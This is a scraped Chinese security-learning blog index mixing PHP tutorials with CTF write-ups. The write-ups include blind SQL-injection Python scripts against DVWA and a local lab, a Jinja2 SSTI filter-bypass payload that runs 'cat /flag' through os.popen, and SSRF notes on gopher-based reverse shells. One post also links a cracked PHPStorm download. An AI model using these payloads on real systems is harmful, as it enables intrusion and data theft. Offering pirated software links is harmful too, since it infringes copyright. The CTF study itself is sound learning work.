# i在上个循环用过了 column_payload = '?id=1\\' and substr((select column_name from information_schema.columns where table_name=\\'flagishere\\' limit '+str(j)+',1),'+str(m)+',1)=\\''+str(n)+'\\' %23&amp;Submit=Submit#' if 'User ID exists in the database.' in s.get(url+column_payload, headers=headers).text: column_name += n print('column'+str(j+1)+'_name: '+column_name) 果然最麻烦得不过写脚本 medium：这一次是需要写post类型的脚本 先个坑吧，后面再来补，初学python写脚本太累了，可能也是因为这几天状态不好吧 CSP BYPASShttps://www.cnblogs.com/-zhong/p/10906270.html JAVA SCRIPThttps://www.cnblogs.com/jojo-feed/p/10206443.html","link":"/2021/01/20/DVWA%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"},{"title":"ISCC括号过滤题复现","text":"本地数据库建立创建数据库: 1create database test1; 创建表： 12345create table `admin`(`id` int(10) not null primary key auto_increment,`username` varchar(20) not null,`password` varchar(32) not null); 插入数据: 1234insert into admin(username,passowrd)values(&quot;admin&quot;,&quot;saddagfkljeaf&quot;) 开始解题测试数据：输入任何数据 发现返回的都是意思就是 flag在password栏里接下来使用sql注入测试一下，发现当我们在单引号后输入=的时候页面回显:illegal input，burp suit爆破测试一下过滤了什么数据：过滤了一些盲注函数包括like regexp，还有where等union查询需要使用的接下来继续测试一下，确定需要使用什么盲注:当我们输入admin’and 1&lt;2#——页面回显是admin也就是我们的用户名，并且是因为此用户名存在才会回显出来当我们输入admin’and 1&gt;2#——页面回显是the content in the password….所以可以确定这里可以使用布尔盲注接下来需要确定使用什么语句进行注入:由于过滤括号，所以无法使用substr等盲注常用函数进行解题这里就要拓展学习一种新方法了: union select+order by盲注 我们这里从后往前解析，order by 3,2的意思是先排序第三列再排序第二列 我们使用的union select 插入的数据的第三列的数据如果小于等于admin的第三列，显示的即为我们插入的数据，如果大于显示的即为admin一行的数据，接下来编写盲注脚本: 12345678910111213141516import requestss= requests.session()url=&quot;http://localhost:81/iscc%e6%8b%ac%e5%8f%b7%e8%bf%87%e6%bb%a4%e8%81%94%e7%b3%bb%e9%a2%98.php&quot;payload_try='abcdefghijklmnopqrstuvwxyz'passwd=&quot;&quot;x=''for i in range(1,30): for j in payload_try: payload=f&quot;admin'union select 1,2,'{j}' order by 3,2#&quot; print(payload) data={&quot;username&quot;:payload,&quot;password&quot;:&quot;sky&quot;} if 'admin' in s.post(url,data).text: passwd+=x print(passwd) break x=j 这里有个点需要注意的就是:由于使用的是order by的排序机制，所以程序不会自己终止，就是会一直按最后一位的字母叠加下去，要记得辨识。由于我比较懒，所以密码弄得就是gggggggg，于是就有了上面的结果。而在本题中，密码就是flag。这篇博客似乎有点水哈哈哈哈哈开学也要好好加油哇！","link":"/2021/03/10/ISCC%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"title":"MAR DASCTF复现","text":"baby_flaskblacklist&lt;/br&gt; '.','[','\\'','&quot;',''\\\\','+',':','_',&lt;/br&gt; 'chr','pop','class','base','mro','init','globals','get',&lt;/br&gt; 'eval','exec','os','popen','open','read',&lt;/br&gt; 'select','url_for','get_flashed_messages','config','request',&lt;/br&gt; 'count','length','０','１','２','３','４','５','６','７','８','９','0','1','2','3','4','5','6','7','8','9'&lt; 以上式过滤的关键字，看起来是啥都被过滤了需要绕过: 感觉对于函数还是一无所知，决定去啃一下flask框架的文档:好了 ，啃完回来了，直接开始构造payload吧:思路:由于它过滤很多内容，所以我们先要将它过滤的内容以其他形式替换找出来:举个栗子:他过滤的数字我们可以用:𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗来代替我们先来贴一下一个大神的payload，再根据他的构造本题的payload: #Author：颖奇L'Amore{% set xhx = (({ }|select()|string()|list()).pop(24)|string())%} # _{% set spa = ((app.__doc__|list()).pop(102)|string())%} #空格{% set pt = ((app.__doc__|list()).pop(320)|string())%} #点{% set yin = ((app.__doc__|list()).pop(337)|string())%} #单引号{% set left = ((app.__doc__|list()).pop(264)|string())%} #左括号 （{% set right = ((app.__doc__|list()).pop(286)|string())%} #右括号）{% set slas = (y1ng.__init__.__globals__.__repr__()|list()).pop(349)%} #斜线/{% set bu = dict(buil=aa,tins=dd)|join() %} #builtins{% set im = dict(imp=aa,ort=dd)|join() %} #import{% set sy = dict(po=aa,pen=dd)|join() %} #popen{% set os = dict(o=aa,s=dd)|join() %} #os{% set ca = dict(ca=aa,t=dd)|join() %} #cat{% set flg = dict(fl=aa,ag=dd)|join() %} #flag{% set ev = dict(ev=aa,al=dd)|join() %} #eval{% set red = dict(re=aa,ad=dd)|join()%} #read{% set bul = xhx*2~bu~xhx*2 %} #__builtins__#拼接起来 __import__('os').popen('cat /flag').read(){% set pld = xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %} 参考:http://ctf.ieki.xyz/library/ssti.html 这里我就解析一下几个看不太懂的点:1.__doc__的作用按我的理解是，调用app中的文档字符串，然后将它收入list当中，最后使用pop函数调用出来特定的我们需要的字符并使用string()函数将这个变量转化为字符串形式（感觉很巧妙，打开新思路了）。2.接下来就是定义几个dict，然后使用join()函数将其进行拼接3.最后就是实现调用 参考：https://blog.csdn.net/miuzzx/article/details/110220425 回看本题:过滤了pop()但是没过滤attr，attr可以获取对象的属性，这里我们可以将其理解为”作用”: {%set a=dict(op=x,p=x)|join()%}#pop{%set b=(()|select|string|list)|attr(a)(𝟐𝟒)%}#获取下划线_{%set c=dict(b,b,dict(do=x,c=x)|join,b,b)join()%}#获取__doc__{%set d=(x|attr(c)|list)|attr(a)(𝟑𝟑𝟕)%}#单引号，这里的x的意思我理解为是一个中转变量，为了后面的attr(a)做准备{%set e=(x|attr(c)|list)|attr(a)(𝟐𝟔𝟒)%}#左括号{%set f=(x|attr(c)|list)|attr(a)(𝟐𝟖𝟔)%}#右括号{%set g=(x|attr(c)|list)|attr(a)(𝟑𝟐𝟎)%}#点{%set h=(x|attr(c)|list)|attr(a)(𝟏𝟎𝟐)%}#空格{%set i=(b,b,dict(in=x,it=x)|join,b,b)|join()%}#__init__{%set j=(b,b,dict(glo=x,bals=x)|join,b,b)|join()%}#__globals__{%set k=(b,b,dict(ge=x,titem=x)|join,b,b)|join()%}#__getitem__{%set l=(b,b,dict(buil=x,tins=x)|join,b,b)|join()%}#__builtins__{%set m=(b,b,dict(im=x,port=x)|join,b,b)|join()%}#__import__{%set n=(x|attr(i)|attr(j)|string|list)|attr(a)(𝟑𝟒𝟗)%}#引入/{%set o=dict(ev=x,al=x)|join()%}{%set p=dict(o=x,s=x)|join()%}{%set q=dict(po=x,pen=x)|join()%}{%set r=dict(re=x,ad=x)|join()%}{%set s=(dict(ls=x)|join,h,n,dict(var=x)|join,n,dict(www=x)|join,n,dict(flask=x)|join)|join()%}{%set t=(m,e,d,p,d,f,g,q,e,d,s,d,f,g,r,e,f)|join()%}#使用import引入os模块，调用read()方法{%set u=x|attr(i)|attr(j)|attr(k)(l)|attr(k)(o)(t)%}#熟悉的类继承利用链{{u}}#执行此链 小结:这次的复现有点迟，好在还是学到了很多东西，感觉ssti注入的最高等级应该就是东拼西凑了吧？可能是我还没遇到更难的题吧","link":"/2021/04/07/MAR-DASCTF%E5%A4%8D%E7%8E%B0/"},{"title":"PHP if switch 数组","text":"今天学习的是条件语句 首先是if语句听说PHP的内核是C语言编写的，所以很多都和C有点像，这个if语句也是格式是： 1234if（条件）{ 条件成立时要执行的代码;//这边有个分号，其他地方没有} 举个例子： 123456&lt;?php $t=22; if($t&gt;&quot;20&quot;){ echo&quot;hwg is cool&quot;;}?&gt; 输出结果是 hwg is cool 然后是if…else语句12345678if (*条件*){*条件成立时执行的代码;*}else{*条件不成立时执行的代码;*} 由于和C都差不多，我就懒得举例了，待会再下面找几个题目过来试试； if…elseif….else 语句感觉这个是会稍微难一点的 123456789101112if (条件){ if 条件成立时执行的代码;}elseif (条件){ elseif 条件成立时执行的代码;}else{ 条件不成立时执行的代码;} 例子： 12345678910111213&lt;?php $t=date(&quot;H&quot;);//这里的date（&quot;H&quot;）代表的意思是获取当前的小时数if ($t&lt;&quot;10&quot;){ echo &quot;have a good morning&quot;;}elseif($t&lt;&quot;20&quot;){ echo&quot;have a good dany!&quot;;}else echo &quot;have a good night&quot;;}?&gt; 补充：function data($value) {}如果是date ，那就是用来获取时间的，h 表示小时，并且是12 小时制的；date(‘Y-m-d H:i:s’, time()); // 2015-8-11 9:05:05，第二个参数不传时默认取当前时间戳date(‘Y’) // 年份 2015，大写Y 是4位，小写为2位date(‘m’) // 月份 8date(‘H’) // 小时 9，大写H 是24小时制，小写为12小时制 switch case语句和C也差不多，就说一下想让执行到一个case语句就输出，就得 加break才可以想让他执行完一圈都没得输出，只能在最后输出，就要在最后加default（default 语句用于不存在匹配（即没有 case 为真）时执行。）举个例子： 1234567891011121314151617&lt;?php$favcolor=&quot;red&quot;;switch ($favcolor){case &quot;red&quot;: echo &quot;你喜欢的颜色是红色!&quot;; break;case &quot;blue&quot;: echo &quot;你喜欢的颜色是蓝色!&quot;; break;case &quot;green&quot;: echo &quot;你喜欢的颜色是绿色!&quot;; break;default: echo &quot;你喜欢的颜色不是 红, 蓝, 或绿色!&quot;;}?&gt; 输出结果是 你喜欢的颜色是红色！ 接下来再来讲一下之前提过的数组首先是array（）函数可以用于创建函数格式是 1array(); 在PHP中，有三种类型的数在 PHP 中，有三种类型的数组： 数值数组 - 带有数字 ID 键的数组有两种创建数值数组的方法： 第一种方法是自动分配ID键； 1$phone=array(&quot;vivo&quot;,&quot;iphone&quot;,&quot;hauwei&quot;);//这样的结果是，vivo会自动变成$phone[0]以此类推 值得注意的是，数组的ID创建是从0开始的 第二种方法是直接创建 12$phone[0]=&quot;vivo&quot;;$phone[1]=&quot;iphone&quot;; 下面运行下实例: 1234&lt;?php$phone=array(&quot;vivo&quot;,&quot;iphone&quot;,&quot;huawei&quot;);echo &quot;I like&quot; . $phone[0] . &quot;,&quot; .$phone[1] . &quot;,&quot;.$phone[2].&quot;.&quot;;?&gt;//输出的结果是我喜欢vivo，iphon，huawei。 关联数组-带有制定的键的数组，每个键关联一个值 通俗点说就是，你要给三个变量都赋予一个相同属性的值，就可以直接用关联数组比如说 1$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); 这样的话，每个人都被赋予了年龄这个属性值举个例子 1234&lt;?php$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);echo &quot;Peter is &quot; . $age['Peter'] . &quot; years old.&quot;;?&gt;//输出的结果是peter is 35years old. 这里有提到一个获取数组的长度-count()函数count()函数用于返回数组的长度（元素的数量）直接放个例子吧 1234&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);echo count($cars);?&gt; 输出的结果是3，原来，这个count输出的是array这个函数数组中所包含的元素数量 遍历数组遍历并打印数值数组中的所有值，可以使用for循环。 123456789&lt;?php$phone=array(&quot;vivo&quot;,&quot;iphone&quot;,&quot;huawei&quot;);$arraylenth=count($iphone);//这边的count（$iphone）就可以直接数出iphone的数组元素长度了for($x=0;$x&lt;$arraylength;x++){ echo $phone[$x]； echo &lt;&quot;br&quot;&gt;;}?&gt; 输出的结果是 vivo iphone huawei遍历并打印关联数组可以使用foreach循环，这里就需要说明一下一下foreach循环了 1234foreach ($array as $value){ 要执行代码;} 1234foreach ($array as $key =&gt; $value){ 要执行代码;} 两个都是foreach循环第一个是，用官方的话来说是，没进行一次循环，当前数组元素的值就会被赋值给$value变量（数组指针会逐一往下移动），在进行下一次循环时，将会看到数组中的键与值我的理解是，（把概念打一遍，突然感觉自己的想法就是概念的想法？），数组的值都会被按顺序以value变量为载体输出 而第二个是，用官方的话来说，每一次循环，当前数组元素的键与值就都会被赋值给 $key 和 $value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。我的理解是，他是在上一种的基础上，多增加了一个$key变量，然后将数组的序号或者代称以key的形式输出，，然后另一个value效果和上一个一样就不说了。然后这个key和value是可以替换成其他字母的 例： 1234567&lt;?php$age=array(&quot;hwg&quot; =&gt;&quot;20&quot;,&quot;hsb&quot;=&gt;&quot;21&quot;,&quot;wjs&quot;=&gt;&quot;19&quot;);foreach($age as $value){ echo $value;}?&gt; 12345678&lt;?php$age=array(&quot;hwg&quot; =&gt;&quot;20&quot;,&quot;hsb&quot;=&gt;&quot;21&quot;,&quot;wjs&quot;=&gt;&quot;19&quot;);foreach($age as $name =&gt; $old){ echo &quot;name=&quot;.$name .&quot;, old=&quot; . $old;//echo输出多个值，中间记得要用.连接 echo &quot;&lt;br&gt;&quot;;}?&gt; PHP数组排序 sort() - 对数组进行升序排列 rsort() - 对数组进行降序排列 asort() - 根据关联数组的值，对数组进行升序排列 ksort() - 根据关联数组的键，对数组进行升序排列 arsort() - 根据关联数组的值，对数组进行降序排列 krsort() - 根据关联数组的键，对数组进行降序排列 列举其中一个就好 1234&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);sort($cars);//其中的sort可以替换?&gt; 输出的结果是按照元素的字母升序排列的","link":"/2020/10/11/PHP-if-switch-%E6%95%B0%E7%BB%84/"},{"title":"PHPSTORM配置随笔记录","text":"当时弄这个弄了好久，不知道是哪一步出错了，最后终于才成功了，于是记录一下，看能不能帮到其他同学们 破解版下载地址：http://www.xue51.com/soft/37849.htmlxdebug安装：https://segmentfault.com/a/1190000011907425这里需要注意的是一定要找到适合自己php版本的xdebug版本，我的是PHP7.4所以我用的xdebug是2.98的xdebug版本查看:https://blog.csdn.net/ABAP_Brave/article/details/78615270xdebug使用教程：https://www.php.cn/jishu/php/410116.html这里说一下操作，打开文件 用小电话监听，用浏览器打开对应页面，然后端口记得设置你服务器的，打点后，开启小甲虫即可","link":"/2021/03/06/PHPSTORM%E9%85%8D%E7%BD%AE%E9%9A%8F%E7%AC%94%E8%AE%B0%E5%BD%95/"},{"title":"PHP超级全局变量以及两个循环","text":"首先是PHP的超级全局变量首先是超级全局变量的定义:意味着它们在一个脚本的全部作用于中都可用，不需要特别说明，就可以在函数及类中使用。 第一个是$GLOBALS这个其实在之前有介绍过了，不过这次的格式可能比较不一样直接拿例子了： 123456789101112&lt;?php $x = 75; $y = 25;function addition() { $GLOBALS['z'] = $GLOBALS['x'] + $GLOBALS['y']; }addition(); echo $z; ?&gt; 输出结果是 100第二个是$_SERVER这是一个包含了很多信息的数组，这个数组中的项目由web服务器创建。 https://www.runoob.com/php/php-superglobals.html在这个链接中，包含了$_SERVER变量中的重要元素 下面整理了几个个人感觉常用命令*$_SERVER[‘REMOTE_ADDR’] //当前用户 IP****$_SERVER[‘SERVER_ADDR’]//当前运行脚本所在的服务器的IP地址**$_SERVER[‘SERVER_PROTOCOL’]//请求页面页面时的通信协议的名称和版本$_SERVER[‘REQUEST_METHOD’]// 访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”这边去看了一下这些指令的区别：首先是get和post get是从服务器上获取数据，post是向服务器传送数据。 get是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到。post是通过HTTP post机制，将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTION属性所指的URL地址。用户看不到这个过程。 对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据。 get传送的数据量较小，不能大于2KB。post传送的数据量较大，一般被默认为不受限制。但理论上，IIS4中最大量为80KB，IIS5中为100KB。 get安全性非常低，post安全性较高。 还有一个更详细 https://www.zhihu.com/question/28586791/answer/767316172等以后遇到需要更深入了解时，再去回顾。**&amp;SERVER[‘HTTPS’]:如果脚本是通过HTTPS协议被访问，则被设为一个非空的值**&amp;_SERVER[‘REMOTE_HOST’]:浏览当前页面的用户的主机名，DNS反向解析不依懒于用户的REMOTE_ADDR&amp;_SERVER[‘REMOTE_PORT’]:用户机器上连接到WEB服务器所使用的端口号&amp;_SERVER[‘SCRIPT_URI’]:URI用来指定要访问的页面**&amp;_SERVER[‘PHP_SELF’]:**当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://example.com/test.php/foo.bar 的脚本中使用 $_SERVER[‘PHP_SELF’] 将得到 /test.php/foo.bar。__FILE_ 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。 第三个是$_REQUEST PHP $_REQUEST 用于收集HTML表单提交的数据。 以下实例显示了一个输入字段（input）及提交按钮(submit)的表单(form)。 当用户通过点击 “Submit” 按钮提交表单数据时, 表单数据将发送至标签中 action 属性中指定的脚本文件。 在这个实例中，我们指定文件来处理表单数据。如果你希望其他的PHP文件来处理该数据，你可以修改该指定的脚本文件名。 然后，我们可以使用超级全局变量 $_REQUEST 来收集表单中的 input 字段数据:(官方理解) 这便补充一下：REQUEST：具有$_POST[]$_GET[]的功能，但是$_REQUEST[]会比较慢。通过post和get方法提交的所有数据都可以通过$REQUEST数组获得 12345678910111213141516//&lt;!DOCTYPE html&gt;//&lt;html&gt;//&lt;body&gt;//&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER['PHP_SELF'];?&gt;&quot;&gt;//Name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;//&lt;input type=&quot;submit&quot;&gt;//&lt;/form&gt;&lt;?php $name = htmlspecialchars($_REQUEST['fname']); echo $name; ?&gt;&lt;/body&gt;&lt;/html&gt; PHP$_POST和PHP$_GETPHP $_POST 被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”post”就是上面个实例，展示一下GET在测试当中 按了那个 123456789//&lt;html&gt;//&lt;body&gt;//&lt;?php //echo &quot;Study &quot; . $_GET['subject'] . &quot; @ &quot; . $_GET['web'];//?&gt;//&lt;/body&gt;//&lt;/html&gt; 会出现一个GET test的按钮，点一下 就会发送subject 和web的参数 感觉这片很水，可能是因为我html还没学，等我学完了再回来补充拓展","link":"/2020/10/12/PHP%E8%B6%85%E7%BA%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E4%BB%A5%E5%8F%8A%E4%B8%A4%E4%B8%AA%E5%BE%AA%E7%8E%AF/"},{"title":"PHP魔术常量以及命名空间","text":"PHP魔术常量-trait其他魔术常量都比较简单，就不具体展开了主要说说trait1.trait的功能和class的功能是很接近的，都可以定义一个类，并赋予方法2.但是如果你要让这个类被中的方法被继承使用，那么就需要使用trait举个例子 12345678910111213141516171819202122&lt;?phpclass cup{ function water() { echo '我可以装水'; }}class wan{ function food() { echo&quot;我可以装食物&quot;; }}class tools{ //此时你如果想要这个tools同时拥有碗和杯子的功能就不可以了。}?&gt; 但是当你把前两个class换成trait时，就可以执行这个功能 123456789101112131415161718192021222324&lt;?phptrait cup{ function water() { echo '我可以装水'; }}trait wan{ function food() { echo&quot;我可以装食物&quot;; }}class tools{ use cup;}$makecup = new tools();$makecup -&gt; water();//-和&gt;之间不可以有空格?&gt; 这边再理解一下trait嵌套trait： 123456789101112131415161718192021222324252627282930313233&lt;?phptrait test{ function demo() { echo&quot;正在测试&quot;; }}trait cup{ use test; function water() { echo '我可以装水'; }}trait wan{ function food() { echo&quot;我可以装食物&quot;; }}class tools{ use cup;}$makecup = new tools();$makecup -&gt; water();//-和&gt;之间不可以有空格$makecup -&gt; demo();?&gt; 如何同时使用多个trait 12345678910111213141516171819202122232425262728293031323334&lt;?phptrait test{ function demo() { echo&quot;正在测试&quot;; }}trait cup{ use test; function water() { echo '我可以装水'; }}trait wan{ function food() { echo&quot;我可以装食物&quot;; }}class tools{ use cup,wan;}$makecup = new tools();$makecup -&gt; water();//-和&gt;之间不可以有空格$makecup -&gt; demo();$makecup -&gt; food();?&gt; 如何避免同名方法？ 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phptrait test{ function demo() { echo&quot;正在测试&quot;; }}trait cup{ use test; function water() { echo '我可以装水'; } function food() { echo&quot;我可以装一点点食物&quot;; }}trait wan{ function food() { echo&quot;我可以装食物&quot;; }}class tools{ use cup,wan { cup::food insteadof wan; }}$makecup = new tools();//$makecup -&gt; water();//-和&gt;之间不可以有空格//$makecup -&gt; demo();$makecup -&gt; food();?&gt; 输出结果是我可以装一点点食物或者可以更改名字来使用原本同名的方法 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phptrait test{ function demo() { echo&quot;正在测试&quot;; }}trait cup{ use test; function water() { echo '我可以装水'; } function food() { echo&quot;我可以装一点点食物&quot;; }}trait wan{ function food() { echo&quot;我可以装食物&quot;; }}class tools{ use cup,wan { cup::food insteadof wan; wan::food as wafood; }}$makecup = new tools();//$makecup -&gt; water();//-和&gt;之间不可以有空格//$makecup -&gt; demo();$makecup -&gt; food();?&gt; 主要就是这些了 接下来是命名空间 namespace可以将命名空间理解为一个文件夹，所以不同文件夹就可以有相同类名。 然后第一个命名空间前不可以有任何代码例： 12345678&lt;?php$a=123;namespace hello;class test{}?&gt; 对于命名空间，我们把其理解为一个文件夹，那么这个文件夹 何时终止呢，我运行代码所用的函数来自哪个文件夹呢？ 12345678910111213141516171819202122&lt;?phpnamespace hello;class test{ function train(){ echo'这是一个大测试'; }}namespace world;class test{ function train(){ echo'这是一个小测试'; }}$a = new test();//此时这个test依旧是属于下方的这个namespace$a -&gt; train; //这个输出的值为 这是一个小测试 那如果想要使用的namespace空间的类和方法则需要&lt;?php 123456789101112131415161718namespace hello;class test{ function train(){ echo'这是一个大测试'; }}namespace world;class test{ function train(){ echo'这是一个小测试'; }}$b = new \\hello\\test();//赋予b这个test类所具有的属性方法$b -&gt; train(); 还可以引入一个子空间的概念,如下面例子，意思就是world文件夹里面的TEST文件夹 123456789namespace world\\TEST\\;//多加一个TEST，则引入了一个子文件夹的概念意味着，你后面可以命名world\\TEST1class test{ function train(){ echo'这是一个小测试'; }}$b = new \\world\\TEST\\test();//赋予b这个test类所具有的属性方法$b -&gt; train(); use和as的使用直接举例子吧，比较容易理解 12345&lt;?phpinclude '你的php文件名（假设是存放有namespace的文件）';//include可以导入文件use world\\TEST\\test；$a= new test();$a -&gt; train(); 这个时候使用的就是world空间里面的train，但是如果我同时用了两个use呢 1234567&lt;?phpinclude '你的php文件名（假设是存放有namespace的文件）';//include可以导入文件，后面要有单引号use world\\TEST\\test；use hello\\test；//这个时候有两个test，$a所要执行的test又无法分清了，所以要**改名字**$a= new test();$a -&gt; train();?&gt; 改为如下 1234567&lt;?phpinclude '你的php文件名（假设是存放有namespace的文件）';//include可以导入文件，后面要有单引号use world\\TEST\\test as test1 ；use hello\\test as test2；// 这个时候已经用as更换名字了，那么接下来的运行就可以分清楚了$a= new test1();$a -&gt; train();?&gt; 如果不想更改类名，那么就需要把方法所属的空间以及类都写下来以示区别。","link":"/2020/10/18/PHP%E9%AD%94%E6%9C%AF%E5%B8%B8%E9%87%8F%E4%BB%A5%E5%8F%8A%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"},{"title":"SSRF注入","text":"简介：服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。 相关危险函数1.函数file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞 （1）.file_get_content函数从用户指定的url获取内容，然后指定一个文件名j进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。 （2）.fsockopen函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限 （3）.curl_exec函数用于执行指定的cURL会话 1234561.一般情况下PHP不会开启fopen的gopher wrapper2.file_get_contents的gopher协议不能URL编码3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用5.curl_exec() //默认不跟踪跳转，6.file_get_contents() // file_get_contents支持php://input协议 2.协议（1）file： 在有回显的情况下，利用 file 协议可以读取任意内容（2）dict：泄露安装软件版本信息，查看端口，操作内网redis服务等（3）gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell（4）http/s：探测内网主机存活 Bypasshttps://blog.csdn.net/qq_39101049/article/details/102501839","link":"/2021/03/26/SSRF%E6%B3%A8%E5%85%A5/"},{"title":"ssti注入绕过深入了解","text":"前言之前学的ssti注入看了一下只是停留在很表层的学习，感觉已经不能适应现在ctf的难度，故决定深入学习payload构造绕过的方式，掌握python编写语法:Flask/Jinja2 ssti注入步骤确定模板类型——&gt;选择对应注入语句 ## Flask/Jingjia2作为 web层面的攻击,我们要关注语言层面的特性和绕过Flask/Jinja2 模板的语法,filters和内建函数,变量,都可能称为绕过的trick基本语法如下:- ``` {{ ... }} for [Expressions](https://jinja.palletsprojects.com/en/2.11.x/templates/#expressions) 里面可以是一个表达式,如1+1,字符串等,支持调用对象的方法,会渲染结果 {% ... %} - for [Statements](https://jinja.palletsprojects.com/en/2.11.x/templates/#list-of-control-structures) ,可以实现for,if等语句,还支持set语法,可以给变量赋值 这里的 {{}} ​``` 自然不必说，用来执行命令，{%%}我突然有了点感觉，他可以给变量赋值，这不就说明了我们使用拼凑法吗，就是先单独对每个过滤项进行赋值，然后将其拼接起来就行。 ### 基础语法 #### 变量 应用把变量传递给模板，可以使用(.)来访问变量的属性，作为替代，也可以使用所谓的下标语法([]) ```{{foo.bar}}{{foo['bar']}}​``` #### 过滤器 变量可以通过过滤器修改。 过滤器与变量用**管道符号(|)分割**，并且也可以用圆括号传递可选参数。 **多个过滤器可以链式调用，前一个过滤器的输出会被作为后一个过滤器的输入。** 举例： {{ name|striptags|title }} 会移除 name 中的所有 HTML 标签并且改写 为标题样式的大小写格式。过滤器接受带圆括号的参数，如同函数调用。这个例子会 把一个列表用逗号连接起来: {{ list|join(', ') }} 。​```#### 空白控制默认配置中，模板引擎不会对空白做进一步修改，所以每个空白（空格、制表符、换行符 等等），配置了trim_blocks，模板标签后的第一个换行符会被自动移除防止-此外，你也可以手动剥离模板中的空白。当你在块（比如一个 for 标签、一段注释或变 量表达式）的开始或结束放置一个减号（ `-` ），可以移除块前或块后的空白:**标签和减号之间不能有空白** {% - if foo - %}...{% endif %}​``` #### 行语句 如果应用启用了行语句，就可以把一个行标记为一个语句。例如如果行语句前缀配置为#，下面的例子就是等价的。 &lt;ul&gt;# for item in seq &lt;li&gt;{{ item }}&lt;/li&gt;# endfor&lt;/ul&gt;&lt;ul&gt;{% for item in seq %} &lt;li&gt;{{ item }}&lt;/li&gt;{% endfor %}&lt;/ul&gt; **PS:**1.若有未闭合的圆括号、花括号或方括号，行语句可以跨越多行: # for href, caption in [('index.html', 'Index'), ('about.html', 'About')]: **2.**##为行注释前缀，行中所有##之后的内容(不包括换行符)会被忽略: #### 转义 1.当从模板中生成HTML时，变量可能包含影响已生成的HTML的字符。有两种解决方法：手动转义每个字符或默认自动转义所有的东西。2.使用手动转义转义通过用管道传递到过滤器|e来实现: {{user.username|e}}​```#### 过滤器#### 赋值在代码块中，你也可以为为变量赋值。在顶层的（块、宏、循环之间）赋值是可导出的，即可以从别的模板中导入。赋值使用set标签，并且可以为多个变量赋值: {% set navigation = [('index.html', 'Index'), ('about.html', 'About')] %}{% set key, value = call_something() %} #### 表达式jinjia中导入都允许使用基本表达式。这像常规的python一样工作。#### 字面量&quot;HELLO&quot;：双引号或单引号中间的一切都是字符串，无论何时你需要在模板中使用一个字符串(比如函数调用、过滤器或只是包含或继承一个模板的参数)。他们都是有用的。42/42.23:直接写下数值就可以创建整数和浮点数。如果有小数点，则为浮点数，否则为整数，在python中，42和42.0是不一样的**dict:**python 中的字典是一种关联键和值的结构。键必须是唯一的，并且键必须只有一个值，字典在模板中很少使用，罕用于**xmlattr()**过滤器之类**PS**所有的true和false都是小写的#### 算式- ``` Jinja 允许你用计算值。这在模板中很少用到，但是为了完整性允许其存在。支持下面的 运算符: - + 把两个对象加到一起。通常对象是素质，但是如果两者是字符串或列表，你可以用这 种方式来衔接它们。无论如何这不是首选的连接字符串的方式！连接字符串见 `~` 运算符。 `{{ 1 + 1 }}` 等于 `2` 。- ``` - 用第一个数减去第二个数。 `{{ 3 - 2 }}` - 等于 `1` 。 - / 对两个数做除法。返回值会是一个浮点数。 `{{ 1 / 2 }}` - 等于 `{{ 0.5 }}` 。 - // 对两个数做除法，返回整数商。 `{{ 20 // 7 }}` 等于 `2` 。 - % 计算整数除法的余数。 `{{ 11 % 7 }}` 等于 `4` 。 - * 用右边的数乘左边的操作数。 `{{ 2 * 2 }}` 会返回 `4` 。也可以用于重 复一个字符串多次。 `{{ ‘=’ * 80 }}` 会打印 80 个等号的横条。 - ** 取左操作数的右操作数次幂。 `{{ 2**3 }}` 会返回 `8` 。 #### 比较- ``` - == 比较两个对象是否相等。 - != 比较两个对象是否不等。 - &gt; 如果左边大于右边，返回 true 。 - &gt;= 如果左边大于等于右边，返回 true 。 - &lt; 如果左边小于右边，返回 true 。 - &lt;= 如果左边小于等于右边，返回 true 。 逻辑对于 if 语句，在 for 过滤或 if 表达式中，它可以用于联合多个表达式:- and 如果左操作数和右操作数同为真，返回 true 。- or 如果左操作数和右操作数有一个为真，返回 true 。- not 对一个表达式取反（见下）。- (expr) 表达式组。提示 is` 和 `in` 运算符同样支持使用中缀记法: `foo is not bar` 和 `foo not 